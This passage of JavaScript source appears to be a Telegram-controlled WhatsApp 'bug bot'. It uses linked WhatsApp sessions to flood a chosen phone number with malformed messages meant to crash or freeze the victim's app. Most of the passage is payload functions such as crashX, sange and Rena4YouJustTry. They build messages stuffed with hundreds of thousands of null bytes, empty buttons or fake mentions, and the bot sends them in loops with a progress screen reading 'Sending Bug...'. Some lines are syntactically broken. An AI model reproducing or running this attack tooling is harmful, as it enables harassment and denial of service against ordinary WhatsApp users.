\`\`\``,
          {
            chat_id: chatId,
message_id: messageId,
parse_mode: "Markdown",
reply_markup: {
  inline_keyboard: [[{
    text: "BACK",
    callback_data: "backmenu",
    style: "danger"
  }]],
},
}
);
} else if (query.data === "backmenu") {
        await bot.editMessageCaption(startMessage, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
          reply_markup: startButton,
        });
      }

      if (number) {
        if (!sessions.size) {
          return bot.answerCallbackQuery(query.id, {
            text: "No WhatsApp bots connected!",
            show_alert: true,
          });
        }

        for (let step = 0; step <= 4; step++) {
          const percentage = (step / 4) * 100;
          const progressBar = "▓▓▓".repeat(step) + "░░░".repeat(4 - step);
          const isProcessing = percentage < 100;
          await bot.editMessageCaption(
            `\`\`\`
  ╭──────────────────────
  │   ${isProcessing ? "      WAIT        " : "    PROCESSING     "}
  │──────────────────────
  │ Target: ${number}
  │ ${
    isProcessing
      ? `Loading: [${progressBar} ${percentage.toFixed(0)}%]`
      : "Status: Sending Bug..."
  }
  ╰──────────────────────\`\`\``,
            {
              chat_id: chatId,
              message_id: messageId,
              parse_mode: "Markdown",
            }
          );

          await new Promise((resolve) => setTimeout(resolve, 500));
        }

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
          try {
            switch (action) {
              case "bxt-blank":
                for (let i = 0; i < 80; i++) {
                await DelayMessage(sock, jid);
                  
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
              case "bxt-delay":
                for (let i = 0; i < 12; i++) {
                  await H4ters(sock, jid);
                  await H4terss(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "bxt-ios":
                for (let i = 0; i < 12; i++) {
                  await lovelyios(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "bxt-kill":
                for (let i = 0; i < 70; i++) {
                  await crashX(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "bxt-combo":
                for (let i = 0; i < 70; i++) {
                  await sange(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
                case "bxt-freez":
                for (let i = 0; i < 70; i++) {
                  await Rena4YouJustTry(sock, jid);
                  await new Promise((r) => setTimeout(r, 500));
                }
                break;
            }
            successCount++;
          } catch (error) {
            failCount++;
          }
        }

        await bot.editMessageCaption(
          `\`\`\`
  ╭─────────────────────────
  │ 🎯 Target: ${number}       
  │ 🐞 Bug Type: ${action}     
  │ ✅ Success: ${successCount}  
  │ ❌ Failed: ${failCount}  
  │─────────────────────────
  │ 🤖 Total Bots: ${sessions.size}  
  ╰─────────────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
          }
        );

        await bot.answerCallbackQuery(query.id);
      }
    }
  } else {
    return;
  }
});

//==================[ BUG FUNCTION ]==================

async function sange(sock, jid) {
    const msg1 = {
        interactiveMessage: {
            body: {
                text: "x"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({
                    buttonId: "\u0000".repeat(1000),
                    buttonText: {
                        displayText: "NEXI TEST" + "\0" + "\x10".repeat(1000)
                    }
                })),
                messageParamsJson: '{}'
            },
            contextInfo: {
                forwardingScore: 99999,
                isForwarded: true,
                forwardedAiBotMessageInfo: {
                    botJid: "867051314767696@bot",
                    metionedJid: "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 })
                },
                forwardOrigin: 4
            }
        }
    };

    await sock.relayMessage(jid, msg1, {})
      participant: true
}

async function Rena4YouJustTry(sock, jid) {
    const bokep1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, bokep1, {
        participant: { jid: jid }
    });

    await sock.relayMessage(jid, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    }, {
        participant: { jid: jid }
    });

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "   " + "ꦾ".repeat(90000)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: jid,
                        mentionedJid: Array.from({ length: 2000 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        )
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, Muda, {
        participant: { jid: jid }
    });
   
   await sock.relayMessage(jid, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: " ",
                  expressions: [
                    {
                      latexExpression: " ",
                      url: "https://t.me/RenaOffc",
                      fontHeight: 9999999
                    }
                  ]
                }
              }
            ],
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
            }
          }
        }
       }
     }, {
      participant: { jid: jid },
      noSelfSync: true
    });
    
   await sock.relayMessage(jid, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: "\u0000".repeat(10000) + " ",
                  expressions: [
                    {
                      latexExpression: " ",
                      fontHeight: 9999999
                    }
                  ]
                }
              },
              {
                messageType: 4,
                tableMetadata: {
                  title: "\0",
                  rows: [
                    {
                      items: ["\0"],
                      isHeading: true
                    }
                  ]
                }
              }
            ],
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4,
              stanzaId: "Rena4You_" + Date.now(),
              participant: jid,
              remoteJid: target,
              mentionedJid: [jid]
            }
          }
        }
      }
    }, {
      participant: { jid: jid },
      noSelfSync: true
    });
     
     const bokep2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, bokep2, {
        participant: { jid: jid }
    });

    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(50000) + "Rena4You𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        extra: "\u0000".repeat(50000),
                        buttons: "A".repeat(20000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, msg1, {
        participant: { jid: jid }
    });

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "Rena4You𑇂𑆵𑆴𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    await sock.relayMessage(jid, msg2, {
        participant: { jid: jid }
    });

    const msg3 = {
        interactiveMessage: {
            body: {
                text: "Rena4You𑇂𑆵𑆴𑆿𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 1000 }, () => ({}))
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () =>
                    Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                ),
                forwardingScore: 999999999,
                isForwarded: true
            }
        }
    };

    await sock.relayMessage(jid, msg3, {
        participant: { jid: jid }
    });

    const message = {
        interactiveMessage: {
            body: {
                text: "\u0000".repeat(60000)
            },
            nativeFlowMessage: {
                buttons: "view_ai_message".repeat(30000)
            }
        }
    };

    await sock.relayMessage(jid, message, {
        participant: { jid: jid }
    });
}

async function H4ters(sock, jid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
       interactiveMessage: {
         body: { text: "End by nexi"},
          nativeFlowMessage: {
            name: "call_permission_request",
            buttons: "\n" + "\u200B" + "\x10".repeat(70000)
              },
              locationMessage: {
                degreesLatitude: 0,
                 degreesLongitude: 0,
                   name: "nexi"+"\u0000".repeat(50000),
                   address: "medan",
              }
            }
          }
      }
  };
  await sock.relayMessage(jid, msg, {
   Participant: true,
  participant: { jid : jid }
 })
}


async function H4terss(sock, jid) {
  const msg = {
    interactiveMessage: {
        body: { text: "bapak lo"},
          nativeFlowMessage: {
            buttons: [
              {
                name: "booking_status",
                    buttonParamsJson: JSON.stringify({
                        display_text:"\u200B" + "ြ".repeat(99999),
                        amount: "1000000 IDR"
                 })
              }
            ]
         }
      }
  };
  await sock.relayMessage(jid, msg, {
   Participant: true,
  participant: { jid : jid }
 })
}

async function crashX(sock, jid) {
    const MakLo = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "MakLo",
                                rows: "\0",
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(jid, MakLo, {});

    await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id
    });
}

async function DelayMessage(sock, jid) {
 const X = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "X"
                    },
                    nativeFlowMessage: {
                        buttons: "meta_ai_message".repeat(30000)
                    }
                }
            }
        }
    };

const X2 = {
     groupStatusMessageV2: {
        message: {
            interactiveMessage: {
             body: {
             text: "ID_CARD_MSG",
             },
            nativeFlowMessage: {
            buttons: Array.from({length: 200900 }, () => ({})),
            },
            contextInfo: {
              quotedMessage: {
               statusAttributionType: 2,
               statusAttributions: Array.from({ length: 200900 }, () => ({})),
               type: 1,
               display_text: "yes",
               vcard: null,
              },
            },
          },
        },
     },
   };

    await sock.relayMessage(jid, 
      X, {});

   await sock.relayMessage(jid, 
      X2, {});

    return {  participant: true
    };
}


//===================================================//
// AUTO UPDATE FROM GITHUB - /update (owner only)
//===================================================//
bot.onText(/^\/update$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "\u274c Ye command sirf owner chala sakta hai.");

  const statusMsg = await bot.sendMessage(chatId, "\ud83d\udd0d Update check ho raha hai...");

  try {
    const r = await checkAndApplyUpdate({ silent: false });

    if (!r.updated) {
      const msgs = {
        latest: "\u2705 Bot already latest version pe hai.",
        invalid: "\u274c Repo ka index.js theek nahi lag raha (syntax/size), update rok diya.",
        "missing-dependencies": "\u274c Update me required package missing hai, isliye safe update rok diya.",
        "already-tried": "\u2139\ufe0f Ye version pehle apply ho chuka hai.",
      };
      return bot.editMessageText(msgs[r.reason] || "\u2705 Koi naya update nahi mila.", {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
    }

    await bot.editMessageText("\ud83d\ude80 Update ho gaya! Bot 3 second me restart hoga...", {
      chat_id: chatId,
      message_id: statusMsg.message_id,
    });

    setTimeout(() => process.exit(0), 3000);
  } catch (e) {
    console.error("Update Error:", e.message);
    bot.sendMessage(chatId, `\u274c Update fail: ${e.message}`);
  }
});
